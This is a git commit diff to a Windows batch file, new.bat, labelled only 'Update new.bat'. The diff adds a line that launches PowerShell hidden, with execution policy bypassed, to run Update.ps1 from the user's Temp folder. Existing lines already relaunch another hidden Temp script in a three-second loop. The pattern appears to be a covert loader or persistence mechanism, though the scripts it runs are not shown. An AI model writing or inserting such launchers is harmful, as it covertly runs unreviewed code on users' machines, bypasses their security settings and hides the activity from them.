d68de1a8f860fef0e8d0a9fd9799aebc5e94f4c2
cia168168 <147810144+cia168168@users.noreply.github.com>
2024-01-14 20:01:03 +0700

    Update new.bat

--- new.bat
+++ new.bat
@@ -1,4 +1,5 @@
 @echo off
+start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%USERPROFILE%\AppData\Local\Temp\Update.ps1"
 :loop
 timeout /t 3 >nul
 start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%USERPROFILE%\AppData\Local\Temp\MyScript.ps1"
